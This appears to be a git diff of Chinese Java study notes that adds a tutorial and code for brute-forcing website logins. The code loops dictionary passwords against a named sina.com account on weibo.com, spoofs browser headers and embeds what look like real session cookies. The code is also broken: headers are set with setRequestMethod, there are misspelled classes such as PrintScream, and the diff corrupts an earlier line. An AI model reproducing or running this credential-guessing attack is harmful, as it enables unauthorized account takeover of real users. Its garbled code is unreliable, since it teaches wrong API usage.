@@ -5396,10 +5396,87 @@ URL类使用示例：
 			
 			huc.connect();
 			InputStream is = uc.getInputStream();
-			BufferedReader br = new BufferedReader(new InputStreamReader(is));
+			BufferedReader br = new BufferedRe ader(new InputStreamReader(is));
 			while(br.readLine()!=null)
 			{
 				System.out.println(br.readLine());
+			}
+		}
+	}
+
+网站登录密码破解：使用字典文件进行暴力破解。  
+字典：一个文档，里面存放的是各种字符的组合，也就是有很多的字符串，在暴力破解的时候，用字典里的字符组合去依次进行输入试探，以达破解密码的目的。  
+
+网站破解步骤：  
+1. 建立HttpURLConnection连接。
+2. 修改设置登陆页面的Request特性，使用setRequestProperty()方法设置我们自己的的请求特性(RequestProperty)，假装后面的请求来自正规浏览器。  
+3. 设置输入、输出都为true。
+4. 从字典文件中读取字符串。  
+5. 将字符串发送到远程服务器中的登陆页面。  
+6. 接收远程服务器返回的数据，查找返回数据中是否有“登陆成功”这样的字样，如果有，那么就是正确的密码。  
+7. 2~6步骤进行循环，每读取一次密码组合都设置一次Request特性，发送一次数据，接收一次数据，比对一次收到的数据。
+
+
+网站登录密码暴力破解使用示例（不完全版）：
+>
+	import java.net.*;
+	import java.io.*;
+	public class WebsitCrackTest
+	{
+		public static void main(String[] args)  throws Exception
+		{
+			//建立一个HttpURLConnection连接
+			//URL means the name and path of the file in the host server 
+			URL u = new URL("http://money.163.com/");
+			//get the urlconnection, it is the conection between local machine and host server
+			URLConnection uc = u.openConnection();
+			//transform the URLConnection to HttpURLConnection,HttpURLConnection is the subClass of URLConnection.
+			HttpURLConnection huc = (HttpURLConnection)uc;
+>			
+			//读取字典文件
+			BufferedReader br = new BufferedReader(new FileInputStream(new File("dic.txt")));
+			String passwd = null;
+			try
+			{
+				while((passwd=br.readLine())!=null)
+				{
+					//设置请求特性，假装成一个浏览器的请求特性
+					huc.setRequestMethod("Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+					huc.setRequestMethod("Accept-Encoding:gzip,deflate,sdch");
+					huc.setRequestMethod("Accept-Language:en,zh-CN;q=0.8,zh;q=0.6,en-US;q=0.4");
+					huc.setRequestMethod("Cache-Control:max-age=0");
+					huc.setRequestMethod("Connection:keep-alive");
+>					
+					huc.setRequestMethod("Cookie:SINAGLOBAL=8825319064781.07.1403880617735; UUG=usr1024; UV5=usrmdins31284; _s_tentry=login.sina.com.cn; Apache=7425474273040.891.1404887269139; ULV=1404887269196:157:111:48:7425474273040.891.1404887269139:1404886212734; myuid=1702227501; SUB=AQPtL6KmQfJpO1wjc%2BSyogVaZLhQn4kx6f0LHxjRCB9dq1GHJxPch7QumasQfwBm5tOXmbo1e%2FljSjLyg4Ho1B%2BZRYZuyJh%2FbzgoGTrg6WBBoscISzrrpMd5AumRrEa%2Bo16ZCeavsKNzZFdyz%2B4PK2nhu6m9VizCZJKfY2e8dKZu; SUBP=002A2c-gVlwEm1dAWxfgXELuuu1xVxBxAuLIWhDMeo9gyfNEJVgSOxiuHYqW8lZpXYODHSZDM0oC_emc1AopXivJHcsb0%3D%3D; login_sid_t=0a52bcf3e3ea1e6ad50be59e449ff192; UOR=passport.weibo.com,weibo.com,login.sina.com.cn");
+>					
+					huc.setRequestMethod("Host:weibo.com");
+					huc.setRequestMethod("If-Modified-Since:Wed, 09 Jul 2014 06:36:10 GMT");
+>					
+					huc.setRequestMethod("Referer:http://login.sina.com.cn/sso/logout.php?entry=miniblog&r=http%3A%2F%2Fweibo.com%2Flogout.php%3Fbackurl%3D%252F");
+>					
+					huc.setDoOutput(true);
+					huc.setDoInput(true);
+					huc.connect();
+>					
+					//打开本机的输出流，也就是远程主机的输入流,向远程主机发送数据
+					PrintScream ps = new PrintStream(huc.getOutputScream());
+					ps.print("username =trileverwt31204@sina.com&passwd = " +passwd);
+					ps.flush();
+>					
+					BufferedReader br1 = new BufferedReader(new inputStreamReader(huc.getInputStream()));
+					string line = null;
+					while((line=br1.readLine())!=null)
+					{
+						if(line.contains("登陆成功"))
+						{
+							System.out.println("the correct passwd is : "+ line);
+						}
+					}
+				}
+			}
+			catch(Exception e)
+			{
+				System.out.println("Error");
 			}
 		}
 	}
